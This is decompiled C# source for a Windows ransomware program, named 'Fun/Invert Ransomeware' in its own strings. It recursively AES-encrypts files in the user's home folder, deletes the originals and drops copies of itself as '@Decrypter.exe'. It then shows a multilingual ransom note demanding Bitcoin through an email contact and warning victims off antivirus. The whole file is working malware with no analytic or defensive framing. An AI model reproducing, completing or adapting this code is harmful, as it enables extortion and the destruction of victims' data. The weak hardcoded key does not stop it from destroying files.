using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Windows.Forms;
using Main;
using inverted.Properties;

namespace inverted;

public class Form1 : Form
{
	private static readonly string EncryptedFileListPath = Path.Combine(Config.WorkFolderPath, "EncryptedFileList.txt");

	private static readonly HashSet<string> EncryptedFiles = new HashSet<string>();

	private const string EncryptionFileExtension = ".fun";

	private const string EncryptionPassword = "thisismycrazypasswords==";

	private static readonly uint SPI_SETDESKWALLPAPER = 20u;

	private static readonly uint SPIF_UPDATEINIFILE = 1u;

	private static readonly uint SPIF_SENDWININICHANGE = 2u;

	private filelist moreForm;

	private Form1 moreForm1;

	private IContainer components = null;

	private Label label1;

	private TextBox textBox1;

	private Button button1;

	private Button button2;

	private TextBox textBox2;

	private Label label2;

	private ComboBox comboBox1;

	private Timer timer1;

	private PictureBox pictureBox1;

	internal static void EncryptFileSystem()
	{
		HashSet<string> extensionsToEncrypt = new HashSet<string>(GetExtensionsToEncrypt());
		EncryptFiles("C:\\Users\\" + Environment.UserName, ".fun", extensionsToEncrypt);
		if (!File.Exists(EncryptedFileListPath))
		{
			string[] contents = EncryptedFiles.ToArray();
			File.WriteAllLines(EncryptedFileListPath, contents);
		}
	}

	internal static HashSet<string> GetEncryptedFiles()
	{
		HashSet<string> hashSet = new HashSet<string>();
		if (File.Exists(EncryptedFileListPath))
		{
			string[] array = File.ReadAllLines(EncryptedFileListPath);
			foreach (string item in array)
			{
				hashSet.Add(item);
			}
		}
		return hashSet;
	}

	private static IEnumerable<string> GetExtensionsToEncrypt()
	{
		HashSet<string> hashSet = new HashSet<string>();
		foreach (string item in Resources.ExtensionsToEncrypt.Split(new string[2]
		{
			Environment.NewLine,
			" "
		}, StringSplitOptions.RemoveEmptyEntries).ToList())
		{
			hashSet.Add(item.Trim());
		}
		hashSet.Remove(".fun");
		return hashSet;
	}

	private static IEnumerable<string> GetFiles(string path)
	{
		Queue<string> queue = new Queue<string>();
		queue.Enqueue(path);
		while (queue.Count > 0)
		{
			path = queue.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string subDir in directories)
				{
					queue.Enqueue(subDir);
				}
			}
			catch (Exception ex2)
			{
				Console.Error.WriteLine(ex2);
			}
			string[] files = null;
			try
			{
				files = Directory.GetFiles(path);
			}
			catch (Exception ex)
			{
				Console.Error.WriteLine(ex);
			}
			if (files != null)
			{
				string[] array = files;
				for (int j = 0; j < array.Length; j++)
				{
					yield return array[j];
				}
			}
		}
	}

	private static void EncryptFiles(string dirPath, string encryptionExtension, HashSet<string> extensionsToEncrypt)
	{
		foreach (string item in from file in GetFiles(dirPath)
			from ext in extensionsToEncrypt
			where file.EndsWith(ext)
			select file into file
			select new
			{
				file = file,
				fi = new FileInfo(file)
			} into t
			where t.fi.Length < 10000000L
			select t.file)
		{
			try
			{
				if (EncryptFile(item, encryptionExtension))
				{
					EncryptedFiles.Add(item);
				}
			}
			catch
			{
			}
		}
	}

	internal static void DecryptFiles(string encryptionExtension)
	{
		foreach (string encryptedFile in GetEncryptedFiles())
		{
			try
			{
				string path = encryptedFile + encryptionExtension;
				DecryptFile(path, encryptionExtension);
				File.Delete(path);
			}
			catch
			{
			}
		}
		File.Delete(EncryptedFileListPath);
	}

	private static bool EncryptFile(string path, string encryptionExtension)
	{
		try
		{
			if (Config.StartMode != 0 && (path.StartsWith(Config.WorkFolderPath, StringComparison.InvariantCulture) || path.StartsWith("C:\\Windows", StringComparison.InvariantCultureIgnoreCase)))
			{
				return false;
			}
			using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
			Guid.NewGuid().ToByteArray();
			File.WriteAllText("C:\\Users\\" + Environment.UserName + "\\hidden.txt", "thisismycrazypasswords==");
			aesCryptoServiceProvider.Key = Convert.FromBase64String("thisismycrazypasswords==");
			aesCryptoServiceProvider.IV = new byte[16]
			{
				0, 1, 0, 3, 5, 3, 0, 1, 0, 0,
				2, 0, 6, 7, 6, 0
			};
			EncryptFile(aesCryptoServiceProvider, path, path + encryptionExtension);
		}
		catch (Exception)
		{
			return false;
		}
		try
		{
			File.Delete(path);
		}
		catch (Exception)
		{
			return false;
		}
		return true;
	}

	private static void DecryptFile(string path, string encryptionExtension)
	{
		try
		{
			if (!path.EndsWith(encryptionExtension))
			{
				return;
			}
			string outputFile = path.Remove(path.Length - 4);
			using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
			aesCryptoServiceProvider.Key = Convert.FromBase64String("thisismycrazypasswords==");
			aesCryptoServiceProvider.IV = new byte[16]
			{
				0, 1, 0, 3, 5, 3, 0, 1, 0, 0,
				2, 0, 6, 7, 6, 0
			};
			DecryptFile(aesCryptoServiceProvider, path, outputFile);
		}
		catch
		{
			return;
		}
		try
		{
			File.Delete(path);
		}
		catch (Exception)
		{
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void EncryptFile(SymmetricAlgorithm alg, string inputFile, string outputFile)
	{
		byte[] array = new byte[65536];
		using FileStream fileStream = new FileStream(inputFile, FileMode.Open);
		using FileStream stream = new FileStream(outputFile, FileMode.Create);
		using CryptoStream cryptoStream = new CryptoStream(stream, alg.CreateEncryptor(), CryptoStreamMode.Write);
		int num;
		do
		{
			num = fileStream.Read(array, 0, array.Length);
			if (num != 0)
			{
				cryptoStream.Write(array, 0, num);
			}
		}
		while (num != 0);
	}

	private static void DecryptFile(SymmetricAlgorithm alg, string inputFile, string outputFile)
	{
		byte[] array = new byte[65536];
		using FileStream fileStream = new FileStream(inputFile, FileMode.Open);
		using FileStream stream = new FileStream(outputFile, FileMode.Create);
		using CryptoStream cryptoStream = new CryptoStream(stream, alg.CreateDecryptor(), CryptoStreamMode.Write);
		int num;
		do
		{
			num = fileStream.Read(array, 0, array.Length);
			if (num != 0)
			{
				cryptoStream.Write(array, 0, num);
			}
		}
		while (num != 0);
	}

	public Form1()
	{
		if (File.Exists("C:\\Users\\" + Environment.UserName + "\\hidden.txt"))
		{
			InitializeComponent();
			return;
		}
		EncryptFileSystem();
		File.WriteAllBytes("C:\\Users\\" + Environment.UserName + "\\Desktop\\@Decrypter.exe", Resources.inverted);
		File.WriteAllBytes("C:\\Users\\" + Environment.UserName + "\\Downloads\\@Decrypter.exe", Resources.inverted);
		File.WriteAllBytes("C:\\Users\\" + Environment.UserName + "\\Documents\\@Decrypter.exe", Resources.inverted);
		File.WriteAllBytes("C:\\Users\\" + Environment.UserName + "\\Pictures\\@Decrypter.exe", Resources.inverted);
		InitializeComponent();
	}

	public void onbuttonclick(object sender, EventArgs e)
	{
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Unknown result type (might be due to invalid IL or missing references)
		WindowsIdentity.GetCurrent().Owner!.ToString();
		if (((Control)textBox1).get_Text() == "")
		{
			MessageBox.Show("ERROR password is incorrect", "Fun Ransomeware", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else if (((Control)textBox1).get_Text().Contains("thisismycrazypasswords=="))
		{
			MessageBox.Show("SUCCESS password is correct, decrypting files do not touch the windows until decryption is finished..", "Invert Ransomeware", (MessageBoxButtons)0, (MessageBoxIcon)64);
			timer1.set_Enabled(true);
			timer1.Start();
		}
		else
		{
			MessageBox.Show("thisismycrazypasswords==");
			MessageBox.Show("INCORRECT, the password is incorrect");
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
	}

	private void getfile(object sender, EventArgs e)
	{
		if (File.Exists("C:\\Users\\" + Environment.UserName + "\\Desktop\\list.txt"))
		{
			moreForm = new filelist();
			((Control)moreForm).Show();
			return;
		}
		using (StreamWriter streamWriter = new StreamWriter("C:\\Users\\" + Environment.UserName + "\\Desktop\\list.txt"))
		{
			foreach (string encryptedFile in GetEncryptedFiles())
			{
				streamWriter.WriteLine(encryptedFile);
			}
		}
		File.SetAttributes("C:\\Users\\" + Environment.UserName + "\\Desktop\\list.txt", FileAttributes.Hidden);
		moreForm = new filelist();
		((Control)moreForm).Show();
	}

	private void textBox2_TextChanged(object sender, EventArgs e)
	{
	}

	private void textBox2_TextChanged_1(object sender, EventArgs e)
	{
		if (comboBox1.get_SelectedItem().ToString()!.Contains("English"))
		{
			string text = "Your all files has been encrypted by invert ransomeware, u cannot\r\nget yor files unless you pay 10$ ransome, you will loose your file\r\nin 2 hours unless the payment is not made, your file are encrypted\r\nwith special encryption algorithom(AES-256), if u think this is a\r\njoke please check your files, they are encrypted .invert, do not rename\r\nthis file named .invert, this activity will loose your files while decrypting\r\nalso note that installing special antivirus wont get back your files\r\nbut they may damage the encrypted files, if your using a office computer\r\nyou are in a big trouble, this ransomeware only ask 10$ as ransome, wishing\r\nyou a very very nice day, do not scan or on a special protection program this\r\nmay corrupt the encrypted file, and you wont get that back again:)";
			((Control)textBox2).set_Text(text);
		}
		if (comboBox1.get_SelectedItem().ToString()!.Contains("Arabic"))
		{
			string text2 = "تم تشفير جميع ملفاتك بواسطة برنامج الفدية العكسي ، لا يمكنك ذلك\r\nاحصل على ملفاتك ما لم تدفع 10 دولارات فدية ، ستفقد ملفك\r\nفي غضون ساعتين ما لم يتم الدفع ، يتم تشفير ملفك\r\nباستخدام خوارزمية تشفير خاصة (AES-256) ، إذا كنت تعتقد أن هذا ملف\r\nنكتة يرجى التحقق من الملفات الخاصة بك ، فهي مشفرة .invert ، لا تقم بإعادة التسمية\r\nهذا الملف المسمى .invert ، سيفقد هذا النشاط ملفاتك أثناء فك تشفير\r\nلاحظ أيض\u064bا أن تثبيت برنامج مكافحة فيروسات خاص لن يؤدي إلى استعادة ملفاتك\r\nلكنها قد تتلف الملفات المشفرة ، إذا كنت تستخدم جهاز كمبيوتر مكتبي\r\nأنت في ورطة كبيرة ، هذه الفدية تطلب 10 دولارات فقط كفدية ، أتمنى\r\nأنت يوم جميل جدا ، لا تفحص هذا أو على برنامج حماية خاص\r\nقد يفسد الملف المشفر ، ولن تستعيده مرة أخرى :)";
			((Control)textBox2).set_Text(text2);
		}
		else if (comboBox1.get_SelectedItem().ToString()!.Contains("French"))
		{
			string text3 = "Tous vos fichiers ont été cryptés par invert ransomeware, vous ne pouvez pas\r\nobtenez vos fichiers à moins que vous ne payiez une rançon de 10\u00a0$, vous perdrez votre fichier\r\nen 2 heures sauf si le paiement n'est pas effectué, vos fichiers sont cryptés\r\navec un algorithme de cryptage spécial (AES-256), si vous pensez que c'est un\r\nblague s'il vous plaît vérifier vos fichiers, ils sont cryptés .invert, ne renommez pas\r\nce fichier nommé .invert, cette activité va perdre vos fichiers lors du décryptage\r\nnotez également que l'installation d'un antivirus spécial ne récupérera pas vos fichiers\r\nmais ils peuvent endommager les fichiers cryptés, si vous utilisez un ordinateur de bureau\r\nvous avez de gros ennuis, ce ransomeware ne demande que 10 $ en rançon, souhaitant\r\nvous une très très belle journée, ne scannez pas ou sur un programme de protection spécial ce\r\npeut corrompre le fichier crypté, et vous ne le récupérerez plus :)";
			((Control)textBox2).set_Text(text3);
		}
	}

	private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
	{
		string text = "تم تشفير جميع ملفاتك بواسطة برنامج الفدية العكسي ، لا يمكنك ذلك\r\nاحصل على ملفاتك ما لم تدفع 10 دولارات فدية ، ستفقد ملفك\r\nفي غضون ساعتين ما لم يتم الدفع ، يتم تشفير ملفك\r\nباستخدام خوارزمية تشفير خاصة (AES-256) ، إذا كنت تعتقد أن هذا ملف\r\nنكتة يرجى التحقق من الملفات الخاصة بك ، فهي مشفرة .invert ، لا تقم بإعادة التسمية\r\nهذا الملف المسمى .invert ، سيفقد هذا النشاط ملفاتك أثناء فك تشفير\r\nلاحظ أيض\u064bا أن تثبيت برنامج مكافحة فيروسات خاص لن يؤدي إلى استعادة ملفاتك\r\nلكنها قد تتلف الملفات المشفرة ، إذا كنت تستخدم جهاز كمبيوتر مكتبي\r\nأنت في ورطة كبيرة ، هذه الفدية تطلب 10 دولارات فقط كفدية ، أتمنى\r\nأنت يوم جميل جدا ، لا تفحص هذا أو على برنامج حماية خاص\r\nقد يفسد الملف المشفر ، ولن تستعيده مرة أخرى :)";
		((Control)comboBox1).set_Text(comboBox1.get_SelectedItem().ToString());
		if (comboBox1.get_SelectedItem().ToString()!.Contains("Arabic"))
		{
			((Control)textBox2).set_Text(text);
		}
		if (comboBox1.get_SelectedItem().ToString()!.Contains("English"))
		{
			string text2 = "Your all files has been encrypted by invert ransomeware, u cannot\r\nget yor files unless you pay 10$ ransome, you will loose your file\r\nin 2 hours unless the payment is not made, your file are encrypted\r\nwith special encryption algorithom(AES-256), if u think this is a\r\njoke please check your files, they are encrypted .invert, do not rename\r\nthis file named .invert, this activity will loose your files while decrypting\r\nalso note that installing special antivirus wont get back your files\r\nbut they may damage the encrypted files, if your using a office computer\r\nyou are in a big trouble, this ransomeware only ask 10$ as ransome, wishing\r\nyou a very very nice day, do not scan or on a special protection program this\r\nmay corrupt the encrypted file, and you wont get that back again:)";
			((Control)textBox2).set_Text(text2);
		}
		else if (comboBox1.get_SelectedItem().ToString()!.Contains("French"))
		{
			string text3 = "Tous vos fichiers ont été cryptés par invert ransomeware, vous ne pouvez pas\r\nobtenez vos fichiers à moins que vous ne payiez une rançon de 10\u00a0$, vous perdrez votre fichier\r\nen 2 heures sauf si le paiement n'est pas effectué, vos fichiers sont cryptés\r\navec un algorithme de cryptage spécial (AES-256), si vous pensez que c'est un\r\nblague s'il vous plaît vérifier vos fichiers, ils sont cryptés .invert, ne renommez pas\r\nce fichier nommé .invert, cette activité va perdre vos fichiers lors du décryptage\r\nnotez également que l'installation d'un antivirus spécial ne récupérera pas vos fichiers\r\nmais ils peuvent endommager les fichiers cryptés, si vous utilisez un ordinateur de bureau\r\nvous avez de gros ennuis, ce ransomeware ne demande que 10 $ en rançon, souhaitant\r\nvous une très très belle journée, ne scannez pas ou sur un programme de protection spécial ce\r\npeut corrompre le fichier crypté, et vous ne le récupérerez plus :)";
			((Control)textBox2).set_Text(text3);
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		((Control)button1).set_Text("Decryption in progress..");
		((Control)button1).set_Enabled(false);
		((Control)button1).set_ForeColor(Color.Green);
		DecryptFiles(".fun");
		MessageBox.Show("All your files has been decrypted successfully, thank you for choosing invert ransomeware have a nice day :)");
		Environment.Exit(0);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_00b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00be: Expected O, but got Unknown
		//IL_00ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_0157: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0263: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0300: Expected O, but got Unknown
		//IL_031b: Unknown result type (might be due to invalid IL or missing references)
		//IL_03bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c9: Expected O, but got Unknown
		//IL_03fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_049f: Unknown result type (might be due to invalid IL or missing references)
		//IL_052b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0535: Expected O, but got Unknown
		//IL_0651: Unknown result type (might be due to invalid IL or missing references)
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		label1 = new Label();
		textBox1 = new TextBox();
		button1 = new Button();
		button2 = new Button();
		textBox2 = new TextBox();
		label2 = new Label();
		comboBox1 = new ComboBox();
		timer1 = new Timer(components);
		pictureBox1 = new PictureBox();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Segoe Script", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(SystemColors.ButtonFace);
		((Control)label1).set_Location(new Point(83, 28));
		((Control)label1).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(786, 31));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("OOPS! ALL YOUR FILES HAS BEEN ENCRYPTED BY FUN RANSOMEWARE");
		((Control)textBox1).set_Location(new Point(89, 385));
		((Control)textBox1).set_Margin(new Padding(4));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(435, 22));
		((Control)textBox1).set_TabIndex(1);
		((Control)button1).set_BackColor(Color.White);
		((Control)button1).set_Location(new Point(533, 382));
		((Control)button1).set_Margin(new Padding(4));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(287, 28));
		((Control)button1).set_TabIndex(2);
		((Control)button1).set_Text("Decrypt my files");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)onbuttonclick);
		((Control)button2).set_BackColor(Color.White);
		((Control)button2).set_Location(new Point(89, 417));
		((Control)button2).set_Margin(new Padding(4));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(731, 44));
		((Control)button2).set_TabIndex(3);
		((Control)button2).set_Text("SHOW ME THE ENCRYPTED FILES LIST");
		((ButtonBase)button2).set_UseVisualStyleBackColor(false);
		((Control)button2).add_Click((EventHandler)getfile);
		((Control)textBox2).set_Cursor(Cursors.get_No());
		((Control)textBox2).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox2).set_Location(new Point(89, 97));
		((Control)textBox2).set_Margin(new Padding(4));
		((TextBoxBase)textBox2).set_Multiline(true);
		((Control)textBox2).set_Name("textBox2");
		textBox2.set_ScrollBars((ScrollBars)2);
		((Control)textBox2).set_Size(new Size(729, 276));
		((Control)textBox2).set_TabIndex(4);
		((Control)textBox2).set_Text(componentResourceManager.GetString("textBox2.Text"));
		((Control)textBox2).add_TextChanged((EventHandler)textBox2_TextChanged_1);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("SimSun-ExtB", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.White);
		((Control)label2).set_Location(new Point(16, 495));
		((Control)label2).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(933, 38));
		((Control)label2).set_TabIndex(5);
		((Control)label2).set_Text("PAYMENTS ARE ACCEPTED IN BITCOIN ONLY, CONTACT FUNRANSOME@PROTONMAIL.COM FOR GETING \r\nTHE DECRYPTION KEY");
		((ListControl)comboBox1).set_FormattingEnabled(true);
		comboBox1.get_Items().AddRange(new object[3] { "English", "French", "Arabic" });
		((Control)comboBox1).set_Location(new Point(659, 63));
		((Control)comboBox1).set_Margin(new Padding(4));
		((Control)comboBox1).set_Name("comboBox1");
		((Control)comboBox1).set_Size(new Size(160, 24));
		((Control)comboBox1).set_TabIndex(6);
		((Control)comboBox1).set_Text("English");
		comboBox1.add_SelectedIndexChanged((EventHandler)comboBox1_SelectedIndexChanged);
		timer1.add_Tick((EventHandler)timer1_Tick);
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(911, 230));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(53, 23));
		pictureBox1.set_TabIndex(7);
		pictureBox1.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Red);
		((Form)this).set_ClientSize(new Size(1067, 554));
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)comboBox1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_Margin(new Padding(4));
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("FUN RANSOMEWARE");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
